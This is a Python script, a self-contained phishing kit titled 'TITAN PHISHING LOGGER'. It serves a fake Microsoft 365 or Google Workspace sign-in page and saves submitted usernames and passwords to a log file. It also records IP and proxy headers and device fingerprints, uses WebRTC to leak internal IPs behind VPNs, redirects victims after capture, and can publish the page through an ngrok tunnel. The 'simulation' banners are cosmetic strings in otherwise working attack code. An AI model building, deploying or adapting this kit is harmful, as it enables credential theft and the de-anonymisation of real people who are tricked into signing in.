#!/usr/bin/env python3
"""
TITAN PHISHING LOGGER – Deep IP, VPN bypass attempts, 3‑file logging
No external dependencies (except optional pyngrok for public tunnel)
Logs: ips.jsonl, creds.jsonl, device.jsonl
"""

import json
import os
import re
import socket
import subprocess
import sys
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

# ========== CONFIGURATION ==========
PORT = 8080
USE_PUBLIC_TUNNEL = False   # Set to True to auto-install pyngrok and get a public ngrok URL
BRAND = "microsoft"          # Options: "microsoft", "google", "generic"

LOG_IPS = "ips.jsonl"
LOG_CREDS = "creds.jsonl"
LOG_DEVICE = "device.jsonl"

# ========== BRANDING ==========
BRANDS = {
    "microsoft": {
        "name": "Microsoft",
        "logo": "🪟",
        "title": "Sign in to Microsoft 365",
        "color": "#2b5797",
        "bg": "#f3f6fc"
    },
    "google": {
        "name": "Google",
        "logo": "🔵",
        "title": "Sign in to Google Workspace",
        "color": "#4285f4",
        "bg": "#ffffff"
    },
    "generic": {
        "name": "Secure Portal",
        "logo": "🔐",
        "title": "Secure Access",
        "color": "#3b82f6",
        "bg": "#f0f2f4"
    }
}
brand = BRANDS.get(BRAND, BRANDS["generic"])

# ========== HTML PAGE (with WebRTC internal IP capture) ==========
HTML = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{brand['title']}</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }}
        body {{
            background: {brand['bg']};
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .card {{
            background: white;
            border-radius: 8px;
            padding: 2rem;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            text-align: center;
        }}
        .logo {{ font-size: 2rem; margin-bottom: 0.5rem; }}
        h1 {{ font-size: 1.5rem; font-weight: 500; color: #202124; }}
        .sub {{ color: #5f6368; font-size: 0.85rem; margin-bottom: 1.5rem; }}
        .warning {{
            background: #fef7e0;
            border-left: 4px solid #f9ab00;
            padding: 0.75rem;
            font-size: 0.75rem;
            color: #5f5b3a;
            margin-bottom: 1.5rem;
            text-align: left;
        }}
        input {{
            width: 100%;
            padding: 0.75rem;
            margin: 0.5rem 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 1rem;
        }}
        input:focus {{
            border-color: {brand['color']};
            outline: none;
            box-shadow: 0 0 0 2px rgba(66,133,244,0.2);
        }}
        button {{
            width: 100%;
            padding: 0.75rem;
            background: {brand['color']};
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            font-weight: 500;
            margin-top: 1rem;
            cursor: pointer;
        }}
        button:hover {{ opacity: 0.9; }}
        .footer {{
            margin-top: 1.5rem;
            font-size: 0.7rem;
            color: #5f6368;
        }}
        .badge {{
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: #202124;
            color: #f9ab00;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 0.6rem;
            font-family: monospace;
        }}
    </style>
</head>
<body>
<div class="card">
    <div class="logo">{brand['logo']}</div>
    <h1>{brand['title']}</h1>
    <div class="sub">Keep your account secure</div>
    <div class="warning">⚠️ SIMULATION – No actual data collection ⚠️</div>
    <form method="POST" action="/login" id="loginForm">
        <input type="text" name="username" placeholder="Email or phone" autocomplete="off" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign in</button>
    </form>
    <div class="footer">Controlled environment training</div>
</div>
<div class="badge">TEST PHISHING SITE</div>

<script>
    // WebRTC internal IP leak (works behind many VPNs)
    function getLocalIPs(callback) {{
        var ips = [];
        var pc = new RTCPeerConnection({{ iceServers: [] }});
        pc.createDataChannel('');
        pc.createOffer()
            .then(offer => pc.setLocalDescription(offer))
            .catch(e => console.log(e));
        pc.onicecandidate = function(event) {{
            if (!event || !event.candidate) return;
            var candidate = event.candidate.candidate;
            var ipMatch = candidate.match(/([0-9]{{1,3}}\.){{3}}[0-9]{{1,3}}/);
            if (ipMatch && ips.indexOf(ipMatch[0]) === -1) ips.push(ipMatch[0]);
        }};
        setTimeout(function() {{
            callback(ips);
            pc.close();
        }}, 1000);
    }}

    // Send internal IPs to server without blocking form submit
    getLocalIPs(function(ips) {{
        if (ips.length) {{
            fetch('/log_webrtc', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ internal_ips: ips }})
            }});
        }}
    }});
</script>
</body>
</html>"""

# ========== LOGGING FUNCTIONS ==========
def now_iso():
    return datetime.now().isoformat()

def write_jsonl(filepath, data):
    with open(filepath, "a") as f:
        f.write(json.dumps(data) + "\n")

def log_ip_request(method, path, headers, client_ip, body=""):
    entry = {
        "timestamp": now_iso(),
        "method": method,
        "path": path,
        "remote_addr": client_ip,
        "x_forwarded_for": headers.get("X-Forwarded-For"),
        "x_real_ip": headers.get("X-Real-Ip"),
        "cf_connecting_ip": headers.get("Cf-Connecting-Ip"),
        "true_client_ip": headers.get("True-Client-Ip"),
        "via": headers.get("Via"),
        "x_forwarded_host": headers.get("X-Forwarded-Host"),
        "x_forwarded_proto": headers.get("X-Forwarded-Proto"),
        "raw_headers": dict(headers)
    }
    write_jsonl(LOG_IPS, entry)

def log_device_info(headers):
    entry = {
        "timestamp": now_iso(),
        "user_agent": headers.get("User-Agent"),
        "accept_language": headers.get("Accept-Language"),
        "sec_ch_ua": headers.get("Sec-Ch-Ua"),
        "sec_ch_ua_platform": headers.get("Sec-Ch-Ua-Platform"),
        "sec_ch_ua_mobile": headers.get("Sec-Ch-Ua-Mobile"),
        "dnt": headers.get("Dnt"),
        "connection": headers.get("Connection"),
        "accept_encoding": headers.get("Accept-Encoding")
    }
    write_jsonl(LOG_DEVICE, entry)

def log_credentials(username, password, client_ip, headers):
    entry = {
        "timestamp": now_iso(),
        "username": username,
        "password": password,
        "remote_ip": client_ip,
        "x_forwarded_for": headers.get("X-Forwarded-For"),
        "user_agent": headers.get("User-Agent")
    }
    write_jsonl(LOG_CREDS, entry)

def log_webrtc_ips(internal_ips, client_ip, headers):
    entry = {
        "timestamp": now_iso(),
        "event": "webrtc_internal_ip_leak",
        "internal_ips": internal_ips,
        "remote_addr": client_ip,
        "x_forwarded_for": headers.get("X-Forwarded-For"),
        "user_agent": headers.get("User-Agent")
    }
    write_jsonl(LOG_DEVICE, entry)  # store in device log as extra info

# ========== HTTP HANDLER ==========
class TitanHandler(BaseHTTPRequestHandler):
    def extract_headers(self):
        return {k: self.headers[k] for k in self.headers.keys()}

    def do_GET(self):
        headers = self.extract_headers()
        client_ip = self.client_address[0]
        log_ip_request("GET", self.path, headers, client_ip)
        log_device_info(headers)

        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(HTML.encode())
        elif self.path == "/favicon.ico":
            self.send_error(404)
        else:
            self.send_error(404)

    def do_POST(self):
        headers = self.extract_headers()
        client_ip = self.client_address[0]
        content_len = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_len).decode() if content_len else ""
        log_ip_request("POST", self.path, headers, client_ip, body)
        log_device_info(headers)

        if self.path == "/login":
            params = parse_qs(body)
            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]
            if username or password:
                log_credentials(username, password, client_ip, headers)
            # Redirect to legitimate site after capture
            self.send_response(302)
            self.send_header("Location", "https://example.com")
            self.end_headers()

        elif self.path == "/log_webrtc":
            try:
                data = json.loads(body)
                internal_ips = data.get("internal_ips", [])
                if internal_ips:
                    log_webrtc_ips(internal_ips, client_ip, headers)
            except:
                pass
            self.send_response(200)
            self.end_headers()

        else:
            self.send_error(404)

    def log_message(self, fmt, *args):
        pass  # suppress default logging

# ========== PUBLIC TUNNEL (ngrok) ==========
def install_pyngrok():
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyngrok", "-q"])
        return True
    except:
        return False

def start_ngrok_tunnel(port):
    try:
        from pyngrok import ngrok
        ngrok.kill()
        public_url = ngrok.connect(port, "http")
        return public_url
    except ImportError:
        print("[*] pyngrok not installed. Attempting to install...")
        if install_pyngrok():
            from pyngrok import ngrok
            ngrok.kill()
            public_url = ngrok.connect(port, "http")
            return public_url
    return None

# ========== MAIN ==========
def main():
    print("\n" + "="*70)
    print(" TITAN PHISHING LOGGER - Deep IP / VPN Bypass Attempt")
    print("="*70)
    print(f" Brand: {brand['name']}")
    print(f" Local URL: http://localhost:{PORT}")
    print(f" Log files: {LOG_IPS}, {LOG_CREDS}, {LOG_DEVICE}")
    print("="*70)

    if USE_PUBLIC_TUNNEL:
        print("[*] Starting ngrok tunnel...")
        url = start_ngrok_tunnel(PORT)
        if url:
            print(f" Public URL (share this): {url}")
        else:
            print("[!] Failed to start tunnel. Running only locally.")
    else:
        print("[*] Public tunnel disabled. Set USE_PUBLIC_TUNNEL = True to enable.")
        print("    Alternatively, use 'ngrok http 8080' manually.")

    print("\n Press Ctrl+C to stop.\n")

    server = HTTPServer(("0.0.0.0", PORT), TitanHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        server.shutdown()
        if USE_PUBLIC_TUNNEL:
            try:
                from pyngrok import ngrok
                ngrok.kill()
            except:
                pass

if __name__ == "__main__":
    main()
